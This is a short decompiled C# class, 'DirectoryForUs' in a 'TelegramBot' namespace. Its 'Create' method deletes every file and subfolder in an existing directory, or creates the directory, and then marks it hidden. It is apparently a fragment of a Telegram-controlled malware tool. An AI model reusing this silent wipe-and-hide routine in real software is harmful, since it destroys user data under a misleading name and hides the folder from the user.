using System;
using System.IO;

namespace TelegramBot
{
	// Token: 0x020000E6 RID: 230
	public class DirectoryForUs
	{
		// Token: 0x060002F1 RID: 753 RVA: 0x00021CBC File Offset: 0x0001FEBC
		public static void Create(string HomeDir, bool Recursive)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(HomeDir);
			if (directoryInfo.Exists)
			{
				FileInfo[] files = directoryInfo.GetFiles();
				for (int i = 0; i < files.Length; i++)
				{
					files[i].Delete();
				}
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				for (int i = 0; i < directories.Length; i++)
				{
					directories[i].Delete(Recursive);
				}
				directoryInfo.Attributes |= FileAttributes.Hidden;
				return;
			}
			directoryInfo.Create();
			directoryInfo.Refresh();
			directoryInfo.Attributes |= FileAttributes.Hidden;
		}
	}
}
